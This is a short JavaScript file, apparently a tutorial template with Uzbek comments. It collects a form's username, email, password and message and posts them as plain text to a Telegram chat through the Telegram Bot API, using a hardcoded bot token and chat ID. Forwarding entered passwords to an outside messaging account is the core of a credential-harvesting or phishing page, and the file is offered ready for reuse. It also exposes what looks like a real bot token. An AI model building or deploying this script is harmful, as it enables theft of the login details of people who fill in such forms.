//bot token
var telegram_bot_id = "5292904097:AAFXmgOxNf6ckmtWx--6wo27KaR0q_nvRvQ"; // token'ni o'rniga Siz yaratgan Bot tokenini yozing
//chat id
var chat_id = 2129534681; // 1111'ni o'rniga habar borishi kerak bo'lgan joyni ID'sini yozing (Batafsil videoda)
var  email, username, password ,message;
var ready = function() {
  
    username = document.getElementById("username").value;
    email = document.getElementById("email").value;
    password = document.getElementById("password").value;
    message = document.getElementById("message").value;
    message = "\nUser: "  + username + "\nEmail: " + email +"\nPassword: "+ password + "\nIzoh: "  + message;
};
var sendtelegram = function() {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function(response) {
        console.log(response);
    });
    document.getElementById("username").value = "";

    document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
    document.getElementById("message").value = "";
    
    return false;
};
